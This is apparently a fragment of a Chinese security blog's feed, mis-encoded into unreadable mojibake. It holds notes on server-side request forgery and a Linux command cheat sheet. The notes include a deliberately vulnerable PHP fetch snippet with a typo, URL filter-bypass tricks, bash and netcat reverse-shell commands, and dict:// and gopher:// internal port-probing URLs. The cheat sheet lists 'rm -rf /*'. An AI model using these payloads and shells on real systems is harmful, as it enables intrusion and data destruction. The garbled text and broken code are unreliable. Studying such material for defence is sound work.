<h2 id="æ¼æ´ä»£ç -1"><a href="#æ¼æ´ä»£ç -1" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php    function curl($url)&#123;        $ch=curl_init();        curl_setpot($ch,CURLOPT_URL,$url);        curl_setopt($ch,CURLOPT_HEADER,0);        curl_exec($ch);        curl_close($ch);&#125;$url=$_GET[&quot;url&quot;]curl($url);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´å‡½æ•°ï¼šfile-get-contents-fsockopen-curl-exec"><a href="#æ¼æ´å‡½æ•°ï¼šfile-get-contents-fsockopen-curl-exec" class="headerlink" title="æ¼æ´å‡½æ•°ï¼šfile_get_contents\fsockopen\curl_exec"></a>æ¼æ´å‡½æ•°ï¼š<code>file_get_contents\fsockopen\curl_exec</code></h3><p><strong>file_get_contents</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif (isset($_POST[&#x27;url&#x27;]))&#123;$content=file_get_contents($_POST[&#x27;url&#x27;]);$filename=&#x27;./images/&#x27;.rand().&#x27;img1.jpg&#x27;;file_put_contents($filename,$content);echo $_POST[&#x27;url&#x27;];$img=&quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;&#125;echo $img?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>ç›´æ¥æ›´æ¢è¾“å…¥ç‚¹ä¸ºæˆ‘ä»¬éœ€è¦è®¿é—®åœ°èµ„æºåœ°å€</p>
<h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol>
<li><p><a href="http://www.baidu.com@www.sina.com/">http://www.baidu.com@www.sina.com</a></p>
</li>
<li><p>ä½¿ç”¨åè¿›åˆ¶ipåœ°å€ï¼Œåå…­è¿›åˆ¶IPåœ°å€å‰é¢åŠ 0xï¼Œå…«è¿›åˆ¶å‰é¢åŠ 0ï¼Œ</p>
</li>
<li><p>ä½¿ç”¨ipåœ°å€ï¼Œä¸é€‚ç”¨åŸŸå</p>
</li>
<li><p>ä½¿ç”¨çŸ­ç½‘å€</p>
</li>
<li><p>è‡ªå·±æ³¨å†Œä¸€ä¸ªåŸŸåï¼ŒæŒ‡å‘127.0.0.1</p>
</li>
<li><p>ä½¿ç”¨xip.io <a href="http://xx.xx.xx.xx.182.1.3.4.xip.io/">http://xx.xx.xx.xx.182.1.3.4.xip.io</a> <a href="http://xx.182.1.3.4.xip.io/">http://xx.182.1.3.4.xip.io/</a> &#x3D;&#x3D;&#x3D;&#x3D;<a href="http://182.1.3.4/">http://182.1.3.4</a></p>
</li>
<li><p>åŠ ä¸Šç«¯å£å·ç»•è¿‡</p>
</li>
<li><p>åŠ ä¸Šæ ¹åŸŸ.</p>
</li>
<li><p>ä½¿ç”¨ä¸­æ–‡å¥å·æ›¿æ¢.</p>
</li>
<li><p>ä½¿ç”¨enclosed alphanumrics â‘ â‘¡â‘¢â‘£â‘¤â‘¥â‘¦â‘§â‘¨â‘©â‘ªâ‘«â‘¬â‘­â‘®â‘¯â‘°â‘±â‘²â‘³â‘´â‘µâ‘¶â‘·â‘¸â‘¹â‘ºâ‘»â‘¼â‘½â‘¾â‘¿â’€â’â’‚â’ƒâ’„â’…â’†â’‡â’ˆâ’‰â’Šâ’‹â’Œâ’â’â’â’â’‘â’’â’“â’”â’•â’–â’—â’˜â’™â’šâ’›â’œâ’â’â’Ÿâ’ â’¡â’¢â’£â’¤â’¥â’¦â’§â’¨â’©â’ªâ’«â’¬â’­â’®â’¯â’°â’±â’²â’³â’´â’µâ’¶â’·â’¸â’¹â’ºâ’»â’¼â’½â’¾â’¿â“€â“â“‚â“ƒâ“„â“…â“†â“‡â“ˆâ“‰â“Šâ“‹â“Œâ“â“â“â“â“‘â“’â““â“”â“•â“–â“—â“˜â“™â“šâ“›â“œâ“â“â“Ÿâ“ â“¡â“¢â“£â“¤â“¥â“¦â“§â“¨â“©â“ªâ“«â“¬â“­â“®â“¯â“°â“±â“²â“³â“´â“µâ“¶â“·â“¸â“¹â“ºâ“»â“¼â“½â“¾â“¿</p>
</li>
<li><p>dns rebinding</p>
<p><a href="https://blog.csdn.net/qq_45449318/article/details/112916226">å…³äºDNS-rebindingçš„æ€»ç»“_ç°å¤ªçš„è¡¨æ ¼çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="https://www.freebuf.com/column/194861.html">DNS Rebinding åŸŸåé‡æ–°ç»‘å®šæ”»å‡»æŠ€æœ¯ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<ol>
<li><strong>dnsé‡ç»‘å®šæŠ€æœ¯ï¼Œæœ‰ä¸‰ç§åˆ©ç”¨å§¿åŠ¿ï¼Œ</strong><ol>
<li>åˆ©ç”¨ttlå€¼ï¼Œè®¾ç½®ttlå€¼ä¸º0ï¼Œæ¯æ¬¡è®¿é—®åŒä¸€åŸŸåéƒ½è¦è¿›è¡Œä¸€æ¬¡åŸŸåè§£æï¼Œç¬¬ä¸€æ¬¡è§£æå‡ºæ¥ä¸€ä¸ªå¤–ç½‘åœ°å€ï¼Œç¬¬äºŒæ¬¡è§£æå‡ºæ¥å†…ç½‘åœ°å€ã€‚æ‰‹åŠ¨ä¿®æ”¹ä¸¤æ¬¡è§£æçš„ç»“æœã€‚ä½¿ä¸¤æ¬¡è®¿é—®ä¸åŒçš„ipä½†åŸŸåè¿˜æ˜¯ä¸€æ ·çš„ã€‚å›½å†…çš„ttlå€¼ä¸èƒ½è®¾ç½®ä¸º0ï¼Œéœ€ä½¿ç”¨å›½å¤–çš„ã€‚</li>
<li>åŸŸåç»‘å®šä¸¤ä¸ªipï¼Œèƒ½ä¸èƒ½æˆåŠŸå…¨é è¿æ°”ã€‚</li>
</ol>
</li>
</ol>
<p><img src="https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled.png"></p>
<p>XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66&#x2F;Untitled.png</p>
<p>3ï¼Œè‡ªå»ºä¸€å°dnsæœåŠ¡å™¨ï¼Œè§£æç»“æœå…¨ç”±è‡ªå·±æ§åˆ¶ã€‚</p>
</li>
</ol>
<p><img src="https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled%201.png"></p>
<p>XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66&#x2F;Untitled%201.png</p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p><strong>ä½¿ç”¨bash</strong></p>
<blockquote>
<p>è¢«æ”»å‡»è€…æ‰§è¡Œå‘½ä»¤ï¼šbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;5555 0&gt;&amp;1</p>
</blockquote>
<blockquote>
<p>æ”»å‡»è€…ç›‘å¬æœ¬æœºçš„5555ç«¯å£ï¼šnc -lvp 5555</p>
</blockquote>
<p><strong>ä½¿ç”¨nc</strong></p>
<p>æ­£å‘nc</p>
<blockquote>
<p>nc -lvp 7777 -e &#x2F;bin&#x2F;bash &#x2F;&#x2F;å°†cmdæ˜ å°„åˆ°æœ¬åœ°çš„7777ç«¯å£</p>
</blockquote>
<blockquote>
<p>nc 172.16.11.6 7777&#x2F;&#x2F;ä¸»åŠ¨å»è¿</p>
</blockquote>
<p>æ–¹å‘nc</p>
<blockquote>
<p>nc -e &#x2F;bin&#x2F;bash 172.16.11.6 7777 &#x2F;&#x2F;å°†cmd.exeå‘é€åˆ°æ§åˆ¶ç«¯ä¸»æœºçš„7777ç«¯å£</p>
</blockquote>
<blockquote>
<p>nc -lvp 7777 &#x2F;&#x2F;ç›‘å¬7777ç«¯å£</p>
</blockquote>
<h3 id="å†…ç½‘ç«¯å£æ¢æµ‹"><a href="#å†…ç½‘ç«¯å£æ¢æµ‹" class="headerlink" title="å†…ç½‘ç«¯å£æ¢æµ‹"></a>å†…ç½‘ç«¯å£æ¢æµ‹</h3><p><code>http://172.16.11.6/ssrf.php?url=dict://172.16.11.41:3306/info</code> infoä¸ºå›ºå®šå†™æ³•</p>
<p><code>http://172.16.11.6/ssrf.php?url=gopher://172.16.11.41:3306/_info</code> gopheråè®®</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxå¸¸ç”¨å‘½ä»¤</title>
    <url>/archives/d0edc1ed.html</url>
    <content><![CDATA[<h1 id="linuxå¸¸ç”¨å‘½ä»¤"><a href="#linuxå¸¸ç”¨å‘½ä»¤" class="headerlink" title="linuxå¸¸ç”¨å‘½ä»¤"></a>linuxå¸¸ç”¨å‘½ä»¤</h1><h1 id="linuxç³»ç»Ÿçš„æ–‡ä»¶ç»“æ„"><a href="#linuxç³»ç»Ÿçš„æ–‡ä»¶ç»“æ„" class="headerlink" title="linuxç³»ç»Ÿçš„æ–‡ä»¶ç»“æ„"></a>linuxç³»ç»Ÿçš„æ–‡ä»¶ç»“æ„</h1><p>Linuxç³»ç»Ÿå‘½ä»¤è¡Œçš„å«ä¹‰</p>
<p><a href="linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%204de50be84c4e44a5b0a8fb15c5169a19.csv">linuxæ–‡ä»¶ç³»ç»Ÿç»“æ„</a></p>
<h1 id="Linuxç³»ç»Ÿå‘½ä»¤è¡Œçš„å«ä¹‰"><a href="#Linuxç³»ç»Ÿå‘½ä»¤è¡Œçš„å«ä¹‰" class="headerlink" title="Linuxç³»ç»Ÿå‘½ä»¤è¡Œçš„å«ä¹‰"></a>Linuxç³»ç»Ÿå‘½ä»¤è¡Œçš„å«ä¹‰</h1><p>ç¤ºä¾‹ï¼šroot@app00:~#</p>
<p>root            &#x2F;&#x2F;ç”¨æˆ·åï¼Œrootä¸ºè¶…çº§ç”¨æˆ·<br>@               &#x2F;&#x2F;åˆ†éš”ç¬¦<br>app00        &#x2F;&#x2F;ä¸»æœºåç§°<br>~               &#x2F;&#x2F;å½“å‰æ‰€åœ¨ç›®å½•ï¼Œé»˜è®¤ç”¨æˆ·ç›®å½•ä¸º~ï¼Œä¼šéšç€ç›®å½•åˆ‡æ¢è€Œå˜åŒ–ï¼Œä¾‹å¦‚ï¼šï¼ˆroot@app00:&#x2F;bin# ï¼Œå½“å‰ä½ç½®åœ¨binç›®å½•ä¸‹ï¼‰</p>
<h1 id="è¡¨ç¤ºå½“å‰ç”¨æˆ·æ˜¯è¶…çº§ç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·ä¸º-ï¼Œä¾‹å¦‚ï¼šï¼ˆâ€yao-app00-root-â€-ï¼Œè¡¨ç¤ºä½¿ç”¨ç”¨æˆ·â€yaoâ€è®¿é—®-rootæ–‡ä»¶å¤¹"><a href="#è¡¨ç¤ºå½“å‰ç”¨æˆ·æ˜¯è¶…çº§ç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·ä¸º-ï¼Œä¾‹å¦‚ï¼šï¼ˆâ€yao-app00-root-â€-ï¼Œè¡¨ç¤ºä½¿ç”¨ç”¨æˆ·â€yaoâ€è®¿é—®-rootæ–‡ä»¶å¤¹" class="headerlink" title="&#x2F;&#x2F;è¡¨ç¤ºå½“å‰ç”¨æˆ·æ˜¯è¶…çº§ç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·ä¸º$ï¼Œä¾‹å¦‚ï¼šï¼ˆâ€yao@app00:&#x2F;root$â€ ï¼Œè¡¨ç¤ºä½¿ç”¨ç”¨æˆ·â€yaoâ€è®¿é—®&#x2F;rootæ–‡ä»¶å¤¹"></a>&#x2F;&#x2F;è¡¨ç¤ºå½“å‰ç”¨æˆ·æ˜¯è¶…çº§ç”¨æˆ·ï¼Œæ™®é€šç”¨æˆ·ä¸º$ï¼Œä¾‹å¦‚ï¼šï¼ˆâ€yao@app00:&#x2F;root$â€ ï¼Œè¡¨ç¤ºä½¿ç”¨ç”¨æˆ·â€yaoâ€è®¿é—®&#x2F;rootæ–‡ä»¶å¤¹</h1><h1 id="å‘½ä»¤çš„ç»„æˆ"><a href="#å‘½ä»¤çš„ç»„æˆ" class="headerlink" title="å‘½ä»¤çš„ç»„æˆ"></a>å‘½ä»¤çš„ç»„æˆ</h1><p>ç¤ºä¾‹ï¼šå‘½ä»¤ å‚æ•°å å‚æ•°å€¼</p>
<h1 id="åŸºç¡€æ“ä½œ"><a href="#åŸºç¡€æ“ä½œ" class="headerlink" title="åŸºç¡€æ“ä½œ"></a>åŸºç¡€æ“ä½œ</h1><h2 id="é‡å¯ç³»ç»Ÿ"><a href="#é‡å¯ç³»ç»Ÿ" class="headerlink" title="é‡å¯ç³»ç»Ÿ"></a>é‡å¯ç³»ç»Ÿ</h2><ol>
<li><p>ç«‹åˆ»å…³æœº</p>
<p> shutdown -h now æˆ–è€… poweroff</p>
</li>
<li><p>ä¸¤åˆ†é’Ÿåå…³æœº</p>
<p>   shutdown -h 2</p>
</li>
</ol>
<h2 id="å…³é—­ç³»ç»Ÿ"><a href="#å…³é—­ç³»ç»Ÿ" class="headerlink" title="å…³é—­ç³»ç»Ÿ"></a>å…³é—­ç³»ç»Ÿ</h2><ol>
<li><p>ç«‹åˆ»é‡å¯</p>
<p>  shutdown -r now æˆ–è€… reboot</p>
</li>
<li><p>ä¸¤åˆ†é’Ÿåé‡å¯</p>
<p> shutdown -r 2</p>
</li>
</ol>
<h2 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h2><p>ifconfig â€“help &#x2F;&#x2F;æŸ¥çœ‹ ifconfig å‘½ä»¤çš„ç”¨æ³•</p>
<h2 id="å‘½ä»¤è¯´æ˜ä¹¦"><a href="#å‘½ä»¤è¯´æ˜ä¹¦" class="headerlink" title="å‘½ä»¤è¯´æ˜ä¹¦"></a>å‘½ä»¤è¯´æ˜ä¹¦</h2><p>man shutdown &#x2F;&#x2F;æ‰“å¼€å‘½ä»¤è¯´æ˜åï¼Œå¯æŒ‰â€qâ€é”®é€€å‡º</p>
<h2 id="åˆ‡æ¢ç”¨æˆ·"><a href="#åˆ‡æ¢ç”¨æˆ·" class="headerlink" title="åˆ‡æ¢ç”¨æˆ·"></a>åˆ‡æ¢ç”¨æˆ·</h2><p>su - yao               &#x2F;&#x2F;åˆ‡æ¢ä¸ºç”¨æˆ·â€yaoâ€,è¾“å…¥åå›è½¦éœ€è¦è¾“å…¥è¯¥ç”¨æˆ·çš„å¯†ç <br>  exit                 &#x2F;&#x2F;é€€å‡ºå½“å‰ç”¨æˆ·</p>
<h1 id="ç›®å½•æ“ä½œ"><a href="#ç›®å½•æ“ä½œ" class="headerlink" title="ç›®å½•æ“ä½œ"></a>ç›®å½•æ“ä½œ</h1><h2 id="åˆ‡æ¢ç›®å½•"><a href="#åˆ‡æ¢ç›®å½•" class="headerlink" title="åˆ‡æ¢ç›®å½•"></a>åˆ‡æ¢ç›®å½•</h2><p>cd &#x2F;                             &#x2F;&#x2F;åˆ‡æ¢åˆ°æ ¹ç›®å½•<br>cd &#x2F;bin                        &#x2F;&#x2F;åˆ‡æ¢åˆ°æ ¹ç›®å½•ä¸‹çš„binç›®å½•<br>cd ..&#x2F;                           &#x2F;&#x2F;åˆ‡æ¢åˆ°ä¸Šä¸€çº§ç›®å½• æˆ–è€…ä½¿ç”¨å‘½ä»¤ï¼šcd ..<br>cd ~                           &#x2F;&#x2F;åˆ‡æ¢åˆ°homeç›®å½•<br>cd -                            &#x2F;&#x2F;åˆ‡æ¢åˆ°ä¸Šæ¬¡è®¿é—®çš„ç›®å½•<br>cd xx(æ–‡ä»¶å¤¹å)         &#x2F;&#x2F;åˆ‡æ¢åˆ°æœ¬ç›®å½•ä¸‹çš„åä¸ºxxçš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨æŠ¥é”™<br>cd &#x2F;xxx&#x2F;xx&#x2F;x              &#x2F;&#x2F;å¯ä»¥è¾“å…¥å®Œæ•´çš„è·¯å¾„ï¼Œç›´æ¥åˆ‡æ¢åˆ°ç›®æ ‡ç›®å½•ï¼Œè¾“å…¥è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨tabé”®å¿«é€Ÿè¡¥å…¨</p>
<h2 id="æŸ¥çœ‹ç›®å½•"><a href="#æŸ¥çœ‹ç›®å½•" class="headerlink" title="æŸ¥çœ‹ç›®å½•"></a>æŸ¥çœ‹ç›®å½•</h2><p>ls                    &#x2F;&#x2F;æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶<br>ls -a                &#x2F;&#x2F;æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—çš„æ–‡ä»¶ï¼‰<br>ls -l                &#x2F;&#x2F;åˆ—è¡¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼ˆåˆ—è¡¨æŸ¥çœ‹ï¼Œæ˜¾ç¤ºæ›´å¤šä¿¡æ¯ï¼‰ï¼Œä¸å‘½ä»¤â€llâ€æ•ˆæœä¸€æ ·<br>ls &#x2F;bin              &#x2F;&#x2F;æŸ¥çœ‹æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶</p>
<h2 id="åˆ›å»ºç›®å½•"><a href="#åˆ›å»ºç›®å½•" class="headerlink" title="åˆ›å»ºç›®å½•"></a>åˆ›å»ºç›®å½•</h2><p>mkdir tools              &#x2F;&#x2F;åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºtoolsçš„ç›®å½•<br>  mkdir &#x2F;bin&#x2F;tools     &#x2F;&#x2F;åœ¨æŒ‡å®šç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºtoolsçš„ç›®å½•</p>
<h2 id="åˆ é™¤ç›®å½•ä¸æ–‡ä»¶"><a href="#åˆ é™¤ç›®å½•ä¸æ–‡ä»¶" class="headerlink" title="åˆ é™¤ç›®å½•ä¸æ–‡ä»¶"></a>åˆ é™¤ç›®å½•ä¸æ–‡ä»¶</h2><p>rm æ–‡ä»¶å              &#x2F;&#x2F;åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br>rm -f æ–‡ä»¶å           &#x2F;&#x2F;åˆ é™¤å½“å‰ç›®å½•çš„çš„æ–‡ä»¶ï¼ˆä¸è¯¢é—®ï¼‰<br>rm -r æ–‡ä»¶å¤¹å         &#x2F;&#x2F;é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹æ­¤åçš„ç›®å½•<br>rm -rf æ–‡ä»¶å¤¹å        &#x2F;&#x2F;é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹æ­¤åçš„ç›®å½•ï¼ˆä¸è¯¢é—®ï¼‰<br>rm -rf *              &#x2F;&#x2F;å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨åˆ é™¤<br>rm -rf &#x2F;*             &#x2F;&#x2F;å°†æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨åˆ é™¤ã€æ…ç”¨ï¼ç›¸å½“äºæ ¼å¼åŒ–ç³»ç»Ÿã€‘</p>
<h2 id="ä¿®æ”¹ç›®å½•"><a href="#ä¿®æ”¹ç›®å½•" class="headerlink" title="ä¿®æ”¹ç›®å½•"></a>ä¿®æ”¹ç›®å½•</h2><p>mv å½“å‰ç›®å½•å æ–°ç›®å½•å        &#x2F;&#x2F;ä¿®æ”¹ç›®å½•åï¼ŒåŒæ ·é€‚ç”¨ä¸æ–‡ä»¶æ“ä½œ<br>mv &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt       &#x2F;&#x2F;å°†&#x2F;usr&#x2F;tmpç›®å½•ä¸‹çš„toolç›®å½•å‰ªåˆ‡åˆ° &#x2F;optç›®å½•ä¸‹é¢<br>mv -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt    &#x2F;&#x2F;é€’å½’å‰ªåˆ‡ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ &#x2F;&#x2F;è¯¥å‘½ä»¤é”™è¯¯</p>
<h2 id="æ‹·è´ç›®å½•"><a href="#æ‹·è´ç›®å½•" class="headerlink" title="æ‹·è´ç›®å½•"></a>æ‹·è´ç›®å½•</h2><p>cp &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt       &#x2F;&#x2F;å°†&#x2F;usr&#x2F;tmpç›®å½•ä¸‹çš„toolç›®å½•å¤åˆ¶åˆ° &#x2F;optç›®å½•ä¸‹é¢<br>  cp -r &#x2F;usr&#x2F;tmp&#x2F;tool &#x2F;opt    &#x2F;&#x2F;é€’å½’å‰ªå¤åˆ¶ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</p>
<p>cp -a a.txt b.txt   &#x2F;&#x2F;å¤åˆ¶æ—¶ä¿ç•™æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œæ—¢ä¿ç•™æ‰€å±ç”¨æˆ·æ‰€å±ç»„ç­‰ä¿¡æ¯</p>
<p>cp -f a.txt b.txt &#x2F;&#x2F;å¼ºåˆ¶è¦†ç›–ç›®æ ‡ç›®å½•åŒåæ–‡ä»¶ï¼Œå› ä¸ºåˆ«åçš„å­˜åœ¨å¯èƒ½ä¸æˆåŠŸï¼Œéœ€è¦æ’¤é”€é»˜è®¤å®šä¹‰çš„åˆ«å</p>
<h2 id="æœç´¢ç›®å½•"><a href="#æœç´¢ç›®å½•" class="headerlink" title="æœç´¢ç›®å½•"></a>æœç´¢ç›®å½•</h2><p>find &#x2F;bin -name â€˜a*â€™ &#x2F;&#x2F;æŸ¥æ‰¾&#x2F;binç›®å½•ä¸‹çš„æ‰€æœ‰ä»¥aå¼€å¤´çš„æ–‡ä»¶æˆ–è€…ç›®å½•</p>
<h2 id="æŸ¥çœ‹å½“å‰ç›®å½•"><a href="#æŸ¥çœ‹å½“å‰ç›®å½•" class="headerlink" title="æŸ¥çœ‹å½“å‰ç›®å½•"></a>æŸ¥çœ‹å½“å‰ç›®å½•</h2><p>pwd &#x2F;&#x2F;æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„</p>
<h1 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h1><h2 id="æ–°å¢æ–‡ä»¶"><a href="#æ–°å¢æ–‡ä»¶" class="headerlink" title="æ–°å¢æ–‡ä»¶"></a>æ–°å¢æ–‡ä»¶</h2><p>touch a.txt &#x2F;&#x2F;åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºåä¸ºaçš„txtæ–‡ä»¶ï¼ˆæ–‡ä»¶ä¸å­˜åœ¨ï¼‰ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå°†æ–‡ä»¶æ—¶é—´å±æ€§ä¿®æ”¹ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´</p>
<h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><p>rm æ–‡ä»¶å              &#x2F;&#x2F;åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br>  rm -f æ–‡ä»¶å           &#x2F;&#x2F;åˆ é™¤å½“å‰ç›®å½•çš„çš„æ–‡ä»¶ï¼ˆä¸è¯¢é—®ï¼‰</p>
<h2 id="ç¼–è¾‘æ–‡ä»¶"><a href="#ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘æ–‡ä»¶"></a>ç¼–è¾‘æ–‡ä»¶</h2><p>vi æ–‡ä»¶å              &#x2F;&#x2F;æ‰“å¼€éœ€è¦ç¼–è¾‘çš„æ–‡ä»¶<br>â€“è¿›å…¥åï¼Œæ“ä½œç•Œé¢æœ‰ä¸‰ç§æ¨¡å¼ï¼šå‘½ä»¤æ¨¡å¼ï¼ˆcommand modeï¼‰ã€æ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰å’Œåº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰<br>å‘½ä»¤æ¨¡å¼<br>-åˆšè¿›å…¥æ–‡ä»¶å°±æ˜¯å‘½ä»¤æ¨¡å¼ï¼Œé€šè¿‡æ–¹å‘é”®æ§åˆ¶å…‰æ ‡ä½ç½®ï¼Œ<br>-ä½¿ç”¨å‘½ä»¤â€ddâ€åˆ é™¤å½“å‰æ•´è¡Œ<br>-ä½¿ç”¨å‘½ä»¤â€&#x2F;å­—æ®µâ€è¿›è¡ŒæŸ¥æ‰¾<br>-æŒ‰â€iâ€åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦å‰å¼€å§‹æ’å…¥<br>-æŒ‰â€aâ€åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦åå¼€å§‹æ’å…¥<br>-æŒ‰â€oâ€åœ¨å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹é¢å¦èµ·ä¸€æ–°è¡Œæ’å…¥<br>-æŒ‰â€ï¼šâ€è¿›å…¥åº•è¡Œæ¨¡å¼<br>æ’å…¥æ¨¡å¼<br>-æ­¤æ—¶å¯ä»¥å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œç¼–è¾‘ï¼Œå·¦ä¸‹è§’ä¼šæ˜¾ç¤º â€œâ€“ æ’å…¥ â€“â€â€<br>-æŒ‰â€ESCâ€è¿›å…¥åº•è¡Œæ¨¡å¼<br>åº•è¡Œæ¨¡å¼<br>-é€€å‡ºç¼–è¾‘ï¼š      :q<br>-å¼ºåˆ¶é€€å‡ºï¼š      :q!<br>-ä¿å­˜å¹¶é€€å‡ºï¼š    :wq</p>
<p>##æ“ä½œæ­¥éª¤ç¤ºä¾‹##</p>
<p>1.ä¿å­˜æ–‡ä»¶ï¼šæŒ‰â€ESCâ€ -&gt; è¾“å…¥â€:â€ -&gt; è¾“å…¥â€wqâ€,å›è½¦     &#x2F;&#x2F;ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘<br>2.å–æ¶ˆæ“ä½œï¼šæŒ‰â€ESCâ€ -&gt; è¾“å…¥â€:â€ -&gt; è¾“å…¥â€q!â€,å›è½¦     &#x2F;&#x2F;æ’¤é”€æœ¬æ¬¡ä¿®æ”¹å¹¶é€€å‡ºç¼–è¾‘</p>
<p>##è¡¥å……##</p>
<p>vim +10 filename.txt                   &#x2F;&#x2F;æ‰“å¼€æ–‡ä»¶å¹¶è·³åˆ°ç¬¬10è¡Œ<br>vim -R &#x2F;etc&#x2F;passwd                     &#x2F;&#x2F;ä»¥åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶</p>
<h2 id="æŸ¥çœ‹æ–‡ä»¶"><a href="#æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶"></a>æŸ¥çœ‹æ–‡ä»¶</h2><p>cat a.txt          &#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶æœ€åä¸€å±å†…å®¹<br>less a.txt         &#x2F;&#x2F;PgUpå‘ä¸Šç¿»é¡µï¼ŒPgDnå‘ä¸‹ç¿»é¡µï¼Œâ€qâ€é€€å‡ºæŸ¥çœ‹<br>more a.txt         &#x2F;&#x2F;æ˜¾ç¤ºç™¾åˆ†æ¯”ï¼Œå›è½¦æŸ¥çœ‹ä¸‹ä¸€è¡Œï¼Œç©ºæ ¼æŸ¥çœ‹ä¸‹ä¸€é¡µï¼Œâ€qâ€é€€å‡ºæŸ¥çœ‹<br>tail -100 a.txt    &#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶çš„å100è¡Œï¼Œâ€Ctrl+Câ€é€€å‡ºæŸ¥çœ‹</p>
<p>tail -f a.txt</p>
<p>sort</p>
<p>uniq</p>
<p>od</p>
<p>strings</p>
<h1 id="åˆ«å"><a href="#åˆ«å" class="headerlink" title="åˆ«å"></a>åˆ«å</h1><p>alias ^c&#x3D;â€™clearâ€™ &#x2F;&#x2F;å®šä¹‰å‘½ä»¤çš„åˆ«å</p>
<p>unalias clear &#x2F;&#x2F;æ’¤é”€åˆ«å</p>
